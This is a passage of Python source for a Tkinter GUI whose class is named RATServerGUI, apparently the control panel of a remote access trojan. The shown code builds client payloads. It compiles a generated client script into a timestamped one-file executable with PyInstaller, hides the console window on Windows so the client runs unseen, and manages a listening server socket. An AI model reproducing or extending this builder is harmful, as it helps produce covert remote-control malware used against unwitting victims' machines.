            self._build_pct_lbl.config(text="80%")
        elif "successfully" in line_lower or "completed" in line_lower:
            self._build_pct_lbl.config(text="100%")

    def build_client_executable(self):
        if not os.path.exists("client_gen.py"):
            self.log_message("Generate client_gen.py first", "error")
            messagebox.showerror("Error", "Generate client_gen.py first (Settings tab).")
            return False

        self._show_section("settings")
        self.root.after(0, self._build_progress_show)

        def _build():
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
                if self.save_to_builds_var.get():
                    dist_path = os.path.join(base_dir, "builds", "clients")
                else:
                    dist_path = os.path.join(base_dir, "dist")

                build_path = os.path.join(base_dir, "build")
                os.makedirs(dist_path, exist_ok=True)
                os.makedirs(build_path, exist_ok=True)

                timestamp = time.strftime("%Y%m%d_%H%M%S")
                name = f"client_{timestamp}"
                client_gen_path = os.path.join(base_dir, "client_gen.py")

                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconfirm",
                    f"--distpath={dist_path}",
                    f"--workpath={build_path}",
                    f"--specpath={build_path}",
                    f"--name={name}",
                ]
                if platform.system() == "Windows":
                    cmd.append("--noconsole")
                cmd.append(client_gen_path)

                self.root.after(0, lambda: self.log_message("Building .exe — cela peut prendre 30-60s…", "info"))

                proc = subprocess.Popen(
                    cmd, cwd=base_dir,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1
                )

                for raw_line in proc.stdout:
                    line = raw_line.rstrip()
                    if not line:
                        continue
                    ln = line  # capture
                    self.root.after(0, lambda l=ln: self._build_log_append(l))
                    self.root.after(0, lambda l=ln: self._build_update_phase(l))

                proc.wait()

                if proc.returncode == 0:
                    ext = ".exe" if platform.system() == "Windows" else ""
                    exe_path = os.path.join(dist_path, f"{name}{ext}")
                    p, d = exe_path, dist_path

                    self.root.after(0, lambda: self._build_progress_hide(success=True))
                    self.root.after(0, lambda: self.log_message(f"[BUILD OK] {p}", "success"))

                    def _show_result():
                        answer = messagebox.askquestion(
                            "Build réussi",
                            f"Executable créé:\n{p}\n\nOuvrir le dossier?",
                            icon="info"
                        )
                        if answer == "yes":
                            if platform.system() == "Windows":
                                subprocess.Popen(f'explorer /select,"{p}"')
                            elif platform.system() == "Darwin":
                                subprocess.Popen(["open", "-R", p])
                            else:
                                subprocess.Popen(["xdg-open", d])

                    self.root.after(0, _show_result)
                    return True
                else:
                    self.root.after(0, lambda: self._build_progress_hide(success=False))
                    self.root.after(0, lambda: self.log_message("Build échoué — voir log de compilation ci-dessus", "error"))
                    return False

            except Exception as e:
                err_msg = str(e)
                self.root.after(0, lambda: self._build_progress_hide(success=False))
                self.root.after(0, lambda: self.log_message(f"Build error: {err_msg}", "error"))
                return False

        threading.Thread(target=_build, daemon=True).start()
        return True

    def on_closing(self):
        if messagebox.askokcancel("Exit", "Stop server and exit?"):
            if self.server_socket: self.stop_server()
            self.root.destroy()


if __name__ == "__main__":
    os.makedirs("dist", exist_ok=True)
    os.makedirs(os.path.join("builds", "clients"), exist_ok=True)
    root = tk.Tk()
    app = RATServerGUI(root)
    root.mainloop()
